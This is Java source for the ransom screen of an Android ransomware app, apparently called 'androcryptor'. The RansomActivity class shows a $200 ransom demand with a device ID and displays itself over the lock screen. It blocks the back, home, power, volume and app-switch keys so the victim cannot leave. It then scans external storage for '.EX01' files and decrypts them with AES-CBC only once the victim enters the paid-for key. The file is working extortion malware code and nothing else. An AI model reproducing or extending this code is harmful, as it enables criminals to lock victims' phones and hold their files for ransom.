/**
 * Manages the ransom interface and decryption process for encrypted files.
 * Handles user input validation and file decryption operations.
 */
//#region Package and Imports
package com.example.androcryptor;

import android.app.Activity;
import android.app.ActivityManager;
import android.app.AlertDialog;
import android.app.ProgressDialog;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.AsyncTask;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.view.KeyEvent;
import android.view.View;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ImageView;
import android.widget.TextView;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.atomic.AtomicInteger;

import javax.crypto.Cipher;
import javax.crypto.CipherInputStream;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;
//#endregion

public class RansomActivity extends AppCompatActivity {
    //#region Constants and Fields
    private static final String TAG = "RansomActivity";
    private static final String ENCRYPTED_FILE_EXTENSION = ".EX01";
    public static boolean decryptionCompleted = false;

    private EditText decryptionKeyInput;
    private Button decryptButton;
    private TextView statusText;
    //#endregion

    //#region Lifecycle Methods
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        decryptionCompleted = false; // Reset the flag
        setContentView(R.layout.activity_ransom);

        // Set flags to show activity over lock screen and keep screen on
        getWindow().addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON |
                WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD |
                WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED |
                WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON |
                WindowManager.LayoutParams.FLAG_FULLSCREEN);

        // Display the device ID (format: EX01XXXXXX)
        TextView deviceIdText = findViewById(R.id.deviceId);
        String deviceId = DeviceUtils.getDeviceId(this);
        deviceIdText.setText(deviceId);

        // Update ransom message with $200 amount
        TextView ransomMessage = findViewById(R.id.ransomMessage);
        ransomMessage.setText(ransomMessage.getText().toString().replace("$500", "$200"));

        // Initialize decryption UI elements
        decryptionKeyInput = findViewById(R.id.decryptionKeyInput);
        decryptButton = findViewById(R.id.decryptButton);
        statusText = findViewById(R.id.statusText);

        // Set up the decrypt button with improved handling
        decryptButton.setOnClickListener(v -> {
            String key = decryptionKeyInput.getText().toString().trim();
            if (key.isEmpty()) {
                Toast.makeText(this, "Please enter a decryption key", Toast.LENGTH_SHORT).show();
                return;
            }

            decryptButton.setText("DECRYPTION IN PROGRESS...");
            decryptionKeyInput.setEnabled(false);
            decryptButton.setEnabled(false);

            // Try to decrypt files with the provided key
            attemptDecryption(key);
        });
    }
    //#endregion

    //#region UI Management Methods
    private void disableRansomActivity() {
        PackageManager pm = getPackageManager();
        ComponentName componentName = new ComponentName(this, RansomActivity.class);
        pm.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
    }

    @Override
    public void onBackPressed() {
        // Completely disable back button
    }

    @Override
    public boolean onKeyDown(int keyCode, KeyEvent event) {
        // Intercept and disable all hardware keys, but only if decryption isn't complete
        if (!decryptionCompleted) {
            return keyCode == KeyEvent.KEYCODE_BACK ||
                   keyCode == KeyEvent.KEYCODE_VOLUME_DOWN ||
                   keyCode == KeyEvent.KEYCODE_VOLUME_UP ||
                   keyCode == KeyEvent.KEYCODE_HOME ||
                   keyCode == KeyEvent.KEYCODE_POWER ||
                   keyCode == KeyEvent.KEYCODE_MENU ||
                   keyCode == KeyEvent.KEYCODE_APP_SWITCH;
        }
        return super.onKeyDown(keyCode, event);
    }
    //#endregion

    //#region Decryption Logic
    private void attemptDecryption(String hexKey) {
        try {
            byte[] key = hexStringToByteArray(hexKey);
            if (key.length != 32) {
                Toast.makeText(this, "Invalid key format", Toast.LENGTH_SHORT).show();
                // Re-enable UI on failure
                decryptionKeyInput.setEnabled(true);
                decryptButton.setEnabled(true);
                decryptButton.setText("DECRYPT FILES");
                return;
            }

            ProgressDialog progressDialog = new ProgressDialog(this);
            progressDialog.setTitle("Decryption in Progress");
            progressDialog.setMessage("Scanning for encrypted files...");
            progressDialog.setCancelable(false);
            progressDialog.setProgressStyle(ProgressDialog.STYLE_HORIZONTAL);
            progressDialog.show();

            new DecryptionTask(key, progressDialog).execute();

        } catch (Exception e) {
            Log.e(TAG, "Error in decryption attempt", e);
            Toast.makeText(this, "Invalid decryption key", Toast.LENGTH_SHORT).show();
            // Re-enable UI on failure
            decryptionKeyInput.setEnabled(true);
            decryptButton.setEnabled(true);
            decryptButton.setText("DECRYPT FILES");
        }
    }

    private byte[] hexStringToByteArray(String s) {
        int len = s.length();
        byte[] data = new byte[len / 2];
        for (int i = 0; i < len; i += 2) {
            data[i / 2] = (byte) ((Character.digit(s.charAt(i), 16) << 4)
                    + Character.digit(s.charAt(i+1), 16));
        }
        return data;
    }
    //#endregion

    //#region Decryption Task Implementation
    private class DecryptionTask extends AsyncTask<Void, Integer, Integer[]> {
        private byte[] decryptionKey;
        private ProgressDialog progressDialog;
        private List<File> encryptedFiles = new ArrayList<>();

        public DecryptionTask(byte[] key, ProgressDialog dialog) {
            this.decryptionKey = key;
            this.progressDialog = dialog;
        }

        @Override
        protected Integer[] doInBackground(Void... params) {
            scanForEncryptedFiles(Environment.getExternalStorageDirectory());
            int totalFiles = encryptedFiles.size();
            if (totalFiles == 0) return new Integer[]{0, 0, 0};

            publishProgress(0, totalFiles);
            AtomicInteger successCount = new AtomicInteger(0);
            ExecutorService executor = Executors.newFixedThreadPool(Runtime.getRuntime().availableProcessors());
            AtomicInteger processedCount = new AtomicInteger(0);

            for (File file : encryptedFiles) {
                executor.submit(() -> {
                    if (decryptFile(file, decryptionKey)) {
                        successCount.incrementAndGet();
                    }
                    publishProgress(processedCount.incrementAndGet(), totalFiles);
                });
            }

            executor.shutdown();
            try {
                executor.awaitTermination(Long.MAX_VALUE, java.util.concurrent.TimeUnit.NANOSECONDS);
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
            }

            return new Integer[]{totalFiles, successCount.get(), totalFiles - successCount.get()};
        }

        @Override
        protected void onProgressUpdate(Integer... values) {
            progressDialog.setProgress(values[0]);
            progressDialog.setMax(values[1]);
            progressDialog.setMessage("Decrypting: " + values[0] + "/" + values[1]);
        }

        @Override
        protected void onPostExecute(Integer[] result) {
            progressDialog.dismiss();
            int totalFiles = result[0];
            int successCount = result[1];

            if (successCount > 0) {
                decryptionCompleted = true;
                disableRansomActivity();

                getSharedPreferences("ac_prefs", Context.MODE_PRIVATE)
                        .edit()
                        .putBoolean("decryption_complete", true)
                        .apply();

                // Clear window flags to remove overlay
                getWindow().clearFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON |
                        WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD |
                        WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED |
                        WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON |
                        WindowManager.LayoutParams.FLAG_FULLSCREEN);

                Intent intent = new Intent(RansomActivity.this, DecryptionSuccessActivity.class);
                intent.putExtra("totalDecrypted", successCount);
                intent.putExtra("totalFiles", totalFiles);
                startActivity(intent);
                finish(); // Destroy RansomActivity
            } else {
                statusText.setText("Decryption failed. Invalid key.");
                Toast.makeText(RansomActivity.this, "Invalid decryption key", Toast.LENGTH_LONG).show();
                // Re-enable UI on failure
                decryptionKeyInput.setEnabled(true);
                decryptButton.setEnabled(true);
                decryptButton.setText("DECRYPT FILES");
            }
        }

        private void scanForEncryptedFiles(File dir) {
            File[] files = dir.listFiles();
            if (files != null) {
                for (File file : files) {
                    if (file.isDirectory()) {
                        scanForEncryptedFiles(file);
                    } else if (file.getName().toLowerCase().endsWith(ENCRYPTED_FILE_EXTENSION.toLowerCase())) {
                        encryptedFiles.add(file);
                    }
                }
            }
        }

        private boolean decryptFile(File file, byte[] key) {
            String originalPath = file.getAbsolutePath().replace(ENCRYPTED_FILE_EXTENSION, "");
            File decryptedFile = new File(originalPath);
            try (FileInputStream fis = new FileInputStream(file)) {
                byte[] iv = new byte[16];
                if (fis.read(iv) != 16) return false;

                Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
                cipher.init(Cipher.DECRYPT_MODE, new SecretKeySpec(key, "AES"), new IvParameterSpec(iv));

                try (FileOutputStream fos = new FileOutputStream(decryptedFile);
                     CipherInputStream cis = new CipherInputStream(fis, cipher)) {
                    byte[] buffer = new byte[8192];
                    int count;
                    while ((count = cis.read(buffer)) != -1) {
                        fos.write(buffer, 0, count);
                    }
                }

                if (decryptedFile.exists() && decryptedFile.length() > 0) {
                    file.delete();
                    return true;
                }
            } catch (Exception e) {
                Log.e(TAG, "Decryption failed for " + file.getName(), e);
            }
            if (decryptedFile.exists()) decryptedFile.delete();
            return false;
        }
    }
    //#endregion
}
